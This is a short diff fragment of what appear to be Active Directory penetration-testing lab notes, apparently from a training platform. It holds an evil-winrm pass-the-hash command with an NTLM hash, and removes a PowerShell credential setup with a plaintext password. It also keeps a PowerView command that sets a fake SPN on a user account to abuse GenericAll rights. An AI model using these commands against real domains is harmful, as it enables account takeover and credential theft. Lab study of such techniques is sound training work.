@@ -42,11 +42,6 @@ evil-winrm -i 10.129.8.25 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
 ## GenericAll
-Creating a User
-```
-$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
-$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
-```
 Creating a Fake SPN
 ```
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
